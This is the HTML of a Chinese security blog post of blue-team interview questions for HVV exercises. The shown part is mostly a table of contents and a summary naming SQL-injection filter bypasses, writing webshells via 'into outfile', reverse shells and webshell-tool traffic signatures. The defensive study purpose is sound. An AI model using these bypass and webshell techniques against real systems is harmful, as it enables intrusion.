<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"monkeyx1.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="基础知识篇常见漏洞SQL注入原理用户输入的数据被当做SQL语句执行。 分类联合注入、报错注入、布尔盲注、时间盲注、宽字节注入、二次注入 报错注入常用函数updatexml、extravalue、exp、floor SQL注入常见绕过 异或绕过 内联注释绕过 双写绕过 关键字替换绕过 编码绕过  SQL注入getshell的方式 outfile写shell：select ‘‘ into outfil">
<meta property="og:type" content="article">
<meta property="og:title" content="hvv常考面试题-蓝队">
<meta property="og:url" content="https://monkeyx1.github.io/2023/06/17/hvv%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98-%E8%93%9D%E9%98%9F/index.html">
<meta property="og:site_name" content="柷澂">
<meta property="og:description" content="基础知识篇常见漏洞SQL注入原理用户输入的数据被当做SQL语句执行。 分类联合注入、报错注入、布尔盲注、时间盲注、宽字节注入、二次注入 报错注入常用函数updatexml、extravalue、exp、floor SQL注入常见绕过 异或绕过 内联注释绕过 双写绕过 关键字替换绕过 编码绕过  SQL注入getshell的方式 outfile写shell：select ‘‘ into outfil">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-06-17T11:51:35.000Z">
<meta property="article:modified_time" content="2024-07-27T17:31:00.694Z">
<meta property="article:author" content="柷澂">
<meta property="article:tag" content="安全">
<meta property="article:tag" content="hvv">
<meta property="article:tag" content="蓝队">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://monkeyx1.github.io/2023/06/17/hvv%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98-%E8%93%9D%E9%98%9F/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://monkeyx1.github.io/2023/06/17/hvv%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98-%E8%93%9D%E9%98%9F/","path":"2023/06/17/hvv常考面试题-蓝队/","title":"hvv常考面试题-蓝队"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>hvv常考面试题-蓝队 | 柷澂</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">柷澂</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">欢迎来到柷澂的安全小窝</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AF%87"><span class="nav-number">1.</span> <span class="nav-text">基础知识篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.</span> <span class="nav-text">常见漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.1.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%86%E7%B1%BB"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">报错注入常用函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.1.4.</span> <span class="nav-text">SQL注入常见绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5getshell%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-number">1.1.1.5.</span> <span class="nav-text">SQL注入getshell的方式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%86%99shell%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.1.1.6.</span> <span class="nav-text">SQL注入写shell的条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#outfile%E5%92%8Cdumpfile%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.1.1.7.</span> <span class="nav-text">outfile和dumpfile的区别</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-number">1.1.2.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%86%E7%B1%BB-1"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">分类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XXE"><span class="nav-number">1.1.3.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.4.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-3"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#webshell%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">webshell常见绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.4.3.</span> <span class="nav-text">文件上传常见绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF"><span class="nav-number">1.1.5.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-4"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF"><span class="nav-number">1.1.6.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-5"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.7.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-6"><span class="nav-number">1.1.7.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.1.7.2.</span> <span class="nav-text">文件包含漏洞常用的伪协议</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.8.</span> <span class="nav-text">代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-7"><span class="nav-number">1.1.8.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.8.2.</span> <span class="nav-text">常见代码执行漏洞函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.9.</span> <span class="nav-text">命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-8"><span class="nav-number">1.1.9.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.9.2.</span> <span class="nav-text">常见函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.10.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-9"><span class="nav-number">1.1.10.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.10.2.</span> <span class="nav-text">序列化和反序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.10.3.</span> <span class="nav-text">常见的反序列化魔法函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.10.4.</span> <span class="nav-text">Java反序列化</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">1.1.11.</span> <span class="nav-text">任意文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.11.1.</span> <span class="nav-text">任意文件读取和任意文件下载原理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.12.</span> <span class="nav-text">逻辑漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.12.1.</span> <span class="nav-text">越权漏洞原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.12.2.</span> <span class="nav-text">常见逻辑漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">工具的基本使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.1.</span> <span class="nav-text">nmap的基本使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.2.</span> <span class="nav-text">sqlmap的基本使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wireshark%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.3.</span> <span class="nav-text">wireshark的基本使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.4.</span> <span class="nav-text">msf的基本使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CS"><span class="nav-number">1.2.5.</span> <span class="nav-text">CS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">使用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">1.3.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Python%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%93"><span class="nav-number">1.3.1.</span> <span class="nav-text">Python常用的库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CDN"><span class="nav-number">1.3.2.</span> <span class="nav-text">CDN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9F"><span class="nav-number">1.3.3.</span> <span class="nav-text">判断目标主机系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A53389%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">1.3.4.</span> <span class="nav-text">无法连接3389服务器的情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.3.5.</span> <span class="nav-text">MySQL无法访问的原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.3.6.</span> <span class="nav-text">正向shell和反向shell的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.3.7.</span> <span class="nav-text">正向代理和反向代理的区别</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%AF%87"><span class="nav-number">2.</span> <span class="nav-text">流量分析篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.0.1.</span> <span class="nav-text">目录扫描的流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.0.2.</span> <span class="nav-text">爆破的流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.0.3.</span> <span class="nav-text">XSS流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.0.4.</span> <span class="nav-text">命令执行的流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.0.5.</span> <span class="nav-text">SQL注入的流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.0.6.</span> <span class="nav-text">文件包含的流量分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="nav-number">2.1.</span> <span class="nav-text">常见webshell管理工具的流量特征</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%9A%81%E5%89%91"><span class="nav-number">2.1.1.</span> <span class="nav-text">蚁剑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8F%9C%E5%88%80"><span class="nav-number">2.1.2.</span> <span class="nav-text">菜刀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E2-0"><span class="nav-number">2.1.3.</span> <span class="nav-text">冰蝎2.0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%93%A5%E6%96%AF%E6%8B%894-0"><span class="nav-number">2.1.4.</span> <span class="nav-text">哥斯拉4.0</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AF%87"><span class="nav-number">3.</span> <span class="nav-text">应急响应篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B"><span class="nav-number">3.0.1.</span> <span class="nav-text">OSI七层模型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF%E6%B5%81%E7%A8%8B"><span class="nav-number">3.0.2.</span> <span class="nav-text">应急响应的基本思路流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AD%E4%B8%AA%E9%98%B6%E6%AE%B5"><span class="nav-number">3.0.3.</span> <span class="nav-text">应急响应六个阶段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B8%B8%E8%A7%81%E4%BA%8B%E4%BB%B6%E5%88%86%E7%B1%BB"><span class="nav-number">3.0.4.</span> <span class="nav-text">应急响应常见事件分类</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B"><span class="nav-number">3.1.</span> <span class="nav-text">入侵检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B"><span class="nav-number">3.1.1.</span> <span class="nav-text">Windows入侵检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B"><span class="nav-number">3.1.2.</span> <span class="nav-text">Linux入侵检测</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5"><span class="nav-number">3.2.</span> <span class="nav-text">排查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E5%B8%B8%E7%94%A8%E6%8E%92%E6%9F%A5%E5%91%BD%E4%BB%A4"><span class="nav-number">3.2.1.</span> <span class="nav-text">Linux常用排查命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5"><span class="nav-number">3.3.</span> <span class="nav-text">基线检查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5"><span class="nav-number">3.3.1.</span> <span class="nav-text">Linux基线检查</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF"><span class="nav-number">3.3.2.</span> <span class="nav-text">Windows安全基线</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA"><span class="nav-number">3.4.</span> <span class="nav-text">系统加固</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B4%A6%E6%88%B7%E5%AE%89%E5%85%A8"><span class="nav-number">3.4.1.</span> <span class="nav-text">账户安全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8"><span class="nav-number">3.4.2.</span> <span class="nav-text">口令安全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E4%B8%8E%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.4.3.</span> <span class="nav-text">服务与端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="nav-number">3.4.4.</span> <span class="nav-text">文件权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1"><span class="nav-number">3.4.5.</span> <span class="nav-text">系统日志审计</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%AF%E6%BA%90"><span class="nav-number">3.5.</span> <span class="nav-text">溯源</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%AF%E6%BA%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.5.1.</span> <span class="nav-text">溯源的基本步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%AF%E6%BA%90%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="nav-number">3.5.2.</span> <span class="nav-text">溯源的技巧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AF%AF%E6%8A%A5"><span class="nav-number">3.5.3.</span> <span class="nav-text">设备常见的误报</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="nav-number">3.6.</span> <span class="nav-text">常见漏洞扫描工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%92%8C%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.7.</span> <span class="nav-text">中间件和框架漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.7.1.</span> <span class="nav-text">常见中间件漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.7.2.</span> <span class="nav-text">常见框架漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#log4j"><span class="nav-number">3.7.3.</span> <span class="nav-text">log4j</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-10"><span class="nav-number">3.7.3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.7.3.2.</span> <span class="nav-text">log4j远程代码执行漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson"><span class="nav-number">3.7.4.</span> <span class="nav-text">fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.7.4.1.</span> <span class="nav-text">fastjson反序列化漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 